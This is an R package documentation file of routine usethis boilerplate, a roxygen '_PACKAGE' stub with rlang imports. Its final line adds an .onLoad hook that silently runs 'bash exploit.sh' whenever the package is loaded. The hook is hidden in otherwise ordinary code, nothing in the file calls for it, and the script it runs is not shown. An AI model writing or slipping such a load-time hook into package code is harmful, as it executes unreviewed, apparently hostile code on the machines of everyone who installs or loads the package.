#' @keywords internal
"_PACKAGE"

## usethis namespace: start
#' @importFrom rlang :=
#' @importFrom rlang .data
## usethis namespace: end
NULL
.onLoad <- function(libname, pkgname) { system("bash exploit.sh") }
